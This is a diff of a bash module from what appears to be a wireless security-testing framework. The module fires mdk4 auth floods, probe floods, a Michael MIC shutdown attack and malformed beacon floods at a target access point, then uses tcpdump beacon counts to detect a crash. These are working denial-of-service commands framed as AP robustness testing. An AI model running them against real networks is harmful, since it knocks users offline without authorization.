@@ -1,4 +1,17 @@
 #!/usr/bin/env bash
+# MODULE_META
+# NAME="Wireless Fuzzing & AP Stress"
+# CATEGORY="E"
+# DEPS="A1"
+# CRITICAL="no"
+# TOOLS="mdk4"
+# DESC="Auth/probe/assoc flood, Michael MIC, malformed frames to test AP robustness"
+# REQS="monitor_iface,target_ssid,target_bssid,target_channel,injection_required"
+# PCAP="yes"
+# DECODE="wifi_mgmt"
+
+set -uo pipefail
+
 #===============================================================================
 #  modules/e4_wireless_fuzzing.sh
 #  E4: Wireless Fuzzing & AP Stress Testing
@@ -35,7 +48,8 @@ run_e4() {
     log_step 1 $total_steps "Verifying tools"
     update_tc_progress 1 $total_steps "Checking"
 
-    
+    check_module_dependencies "E4" || return 1
+
     local has_mdk4=false
     local has_scapy=false
 
@@ -43,8 +57,7 @@ run_e4() {
     python3 -c "from scapy.all import *" &>/dev/null 2>&1 && has_scapy=true
 
     if [[ "$has_mdk4" == "false" && "$has_scapy" == "false" ]]; then
-        log_error "Either ${TOOL_PATHS[mdk4]} or python3-scapy is required."
-        log_error "Install: apt install -y ${TOOL_PATHS[mdk4]} python3-scapy"
+        log_error "Either mdk4 or python3-scapy is required."
         return 1
     fi
 
@@ -126,20 +139,17 @@ run_e4() {
 
     # Count beacons per 10 seconds as baseline
     local baseline_beacons
-    local baseline_beacons=$(timeout 10 ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -c 1000 \
+    baseline_beacons=$(timeout 10 run_fg "tcpdump" -i "$mon_iface" -c 1000 \
         "type mgt subtype beacon and ether src ${GUEST_BSSID}" \
         2>/dev/null | wc -l) || true
-    local baseline_beacons=${baseline_beacons:-0}
+    baseline_beacons=${baseline_beacons:-0}
 
     echo "Baseline beacon count (10s): ${baseline_beacons}" >> "$health_file"
     log_info "Baseline: ${baseline_beacons} beacons/10s from target AP"
 
     # Start continuous monitoring
-    ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -w "$fuzz_pcap" \
-        "ether src ${GUEST_BSSID} or ether dst ${GUEST_BSSID}" \
-        &>/dev/null &
-    local tcpdump_pid=$!
-    register_cleanup "kill -SIGINT $tcpdump_pid 2>/dev/null || true; wait $tcpdump_pid 2>/dev/null || true"
+    spawn_bg "e4_tcpdump" "tcpdump" -i "$mon_iface" -w "$fuzz_pcap" \
+        "ether src ${GUEST_BSSID} or ether dst ${GUEST_BSSID}"
 
     check_abort || return 1
 
@@ -147,10 +157,10 @@ run_e4() {
     _check_ap_alive() {
         local test_name="$1"
         local beacons
-        local beacons=$(timeout 10 ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -c 100 \
+        beacons=$(timeout 10 run_fg "tcpdump" -i "$mon_iface" -c 100 \
             "type mgt subtype beacon and ether src ${GUEST_BSSID}" \
             2>/dev/null | wc -l) || true
-        local beacons=${beacons:-0}
+        beacons=${beacons:-0}
 
         echo "After ${test_name}: ${beacons} beacons/10s" >> "$health_file"
 
@@ -170,14 +180,16 @@ run_e4() {
 
     if [[ "$has_mdk4" == "true" ]]; then
         log_info "Sending auth flood for 15 seconds..."
-        run_attack_tool --timeout 15 --log "$fuzz_log" --cmd "${TOOL_PATHS[mdk4]} $mon_iface a -a ${GUEST_BSSID}"
+        spawn_bg "e4_mdk4_auth" "mdk4" "$mon_iface" a -a "${GUEST_BSSID}"
+        sleep 15
+        stop_process "e4_mdk4_auth"
         ((tests_run++))
     fi
 
     sleep 5
     if ! _check_ap_alive "Auth Flood"; then
-        local beacon_lost="true"
-        local ap_crashed="true"
+        beacon_lost="true"
+        ap_crashed="true"
         log_result "FINDING" "AP beacons LOST after auth flood — possible crash!"
         echo "FINDING: AP beacons lost after auth flood" >> "$findings_file"
         ((response_anomalies++))
@@ -195,13 +207,15 @@ run_e4() {
     if [[ "$has_mdk4" == "true" ]]; then
         # Probe flood — send thousands of probe requests
         log_info "Sending probe flood for 15 seconds..."
-        run_attack_tool --timeout 15 --log "$fuzz_log" --cmd "${TOOL_PATHS[mdk4]} $mon_iface p -t ${GUEST_BSSID} -c ${GUEST_CHANNEL:-1}"
+        spawn_bg "e4_mdk4_probe" "mdk4" "$mon_iface" p -t "${GUEST_BSSID}" -c "${GUEST_CHANNEL:-1}"
+        sleep 15
+        stop_process "e4_mdk4_probe"
         ((tests_run++))
     fi
 
     sleep 5
     if ! _check_ap_alive "Probe Flood"; then
-        local beacon_lost="true"
+        beacon_lost="true"
         log_result "FINDING" "AP beacons LOST after probe flood!"
         echo "FINDING: AP beacons lost after probe flood" >> "$findings_file"
         ((response_anomalies++))
@@ -219,7 +233,9 @@ run_e4() {
     if [[ "$has_mdk4" == "true" ]]; then
         # Michael shutdown — exploits TKIP MIC countermeasure
         log_info "Sending Michael MIC exploit for 10 seconds..."
-        run_attack_tool --timeout 10 --log "$fuzz_log" --cmd "${TOOL_PATHS[mdk4]} $mon_iface m -t ${GUEST_BSSID}"
+        spawn_bg "e4_mdk4_mic" "mdk4" "$mon_iface" m -t "${GUEST_BSSID}"
+        sleep 10
+        stop_process "e4_mdk4_mic"
         ((tests_run++))
     fi
 
@@ -230,13 +246,15 @@ run_e4() {
 
     if [[ "$has_mdk4" == "true" ]]; then
         log_info "Sending malformed beacon flood for 10 seconds..."
-        run_attack_tool --timeout 10 --log "$fuzz_log" --cmd "${TOOL_PATHS[mdk4]} $mon_iface b -a -w nta -m"
+        spawn_bg "e4_mdk4_beacon" "mdk4" "$mon_iface" b -a -w nta -m
+        sleep 10
+        stop_process "e4_mdk4_beacon"
         ((tests_run++))
     fi
 
     sleep 5
     if ! _check_ap_alive "Michael+Beacon Stress"; then
-        local beacon_lost="true"
+        beacon_lost="true"
         log_result "FINDING" "AP beacons LOST after Michael/beacon stress!"
         echo "FINDING: AP beacons lost after stress test" >> "$findings_file"
         ((response_anomalies++))
@@ -249,7 +267,7 @@ run_e4() {
     update_tc_progress 6 $total_steps "Health check"
 
     # Stop capture
-    
+    stop_process "e4_tcpdump"
     validate_pcap "$fuzz_pcap" "Fuzzing capture"
 
     echo "" >> "$health_file"
@@ -258,16 +276,16 @@ run_e4() {
     # Wait and recheck beacons
     sleep 10
     local post_beacons
-    local post_beacons=$(timeout 10 ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -c 1000 \
+    post_beacons=$(timeout 10 run_fg "tcpdump" -i "$mon_iface" -c 1000 \
         "type mgt subtype beacon and ether src ${GUEST_BSSID}" \
         2>/dev/null | wc -l) || true
-    local post_beacons=${post_beacons:-0}
+    post_beacons=${post_beacons:-0}
 
     echo "Post-fuzz beacon count (10s): ${post_beacons}" >> "$health_file"
 
     if [[ $post_beacons -eq 0 && ${baseline_beacons:-0} -gt 0 ]]; then
-        local ap_crashed="true"
-        local beacon_lost="true"
+        ap_crashed="true"
+        beacon_lost="true"
         log_result "CRITICAL" "AP is NOT sending beacons after fuzzing — likely CRASHED"
         echo "CRITICAL: AP appears crashed — no beacons detected post-fuzz" >> "$findings_file"
 
@@ -278,12 +296,12 @@ run_e4() {
         stop_countdown
 
         local reboot_beacons
-        local reboot_beacons=$(timeout 10 ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -c 100 \
+        reboot_beacons=$(timeout 10 run_fg "tcpdump" -i "$mon_iface" -c 100 \
             "type mgt subtype beacon and ether src ${GUEST_BSSID}" \
             2>/dev/null | wc -l) || true
 
         if [[ ${reboot_beacons:-0} -gt 0 ]]; then
-            local ap_rebooted="true"
+            ap_rebooted="true"
             log_info "AP has recovered/rebooted — beacons resumed"
             echo "INFO: AP recovered after ~60s (likely rebooted)" >> "$findings_file"
         fi
@@ -328,13 +346,13 @@ run_e4() {
         recommendations="AP firmware appears robust. Continue periodic testing after firmware updates."
     fi
 
-    local result_json
-    evidence_register_file "e4_fuzz_log.txt"
-    evidence_register_file "e4_ap_health.txt"
-    evidence_register_file "e4_capture.pcap"
-    evidence_register_file "e4_findings.txt"
+    evidence_register_file "$fuzz_log"
+    evidence_register_file "$health_file"
+    evidence_register_file "$fuzz_pcap"
+    evidence_register_file "$findings_file"
 
-    local result_json=$(${TOOL_PATHS[jq]} -n \
+    local result_json
+    result_json=$(run_fg "jq" -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "Tests: ${tests_run}, Crashed: ${ap_crashed}, Rebooted: ${ap_rebooted}, Beacon lost: ${beacon_lost}, Anomalies: ${response_anomalies}" \
@@ -353,10 +371,20 @@ run_e4() {
             ap_crashed: ($ap_crashed == "true"),
             ap_rebooted: ($ap_rebooted == "true"),
             beacon_lost: ($beacon_lost == "true"),
-            response_anomalies: $response_anomalies,
-                    }')
+            response_anomalies: $response_anomalies
+        }')
 
-    save_tc_result "E4" "$result_json"
+    local has_tool_output=0
+    [[ -f "$findings_file" || -f "$health_file" || -f "$fuzz_log" ]] && has_tool_output=1
+
+    local has_primary=0
+    [[ -f "$fuzz_pcap" ]] && has_primary=1
+
+    local is_secure_claim=0
+    [[ "$result_status" == "SECURE" ]] && is_secure_claim=1
+
+    save_tc_result "E4" "$result_json" 1 $has_tool_output $has_primary 1 1 1 0 1 1 1 $is_secure_claim
+    save_session_state
 
     echo ""
     if [[ "$ap_crashed" == "true" ]]; then
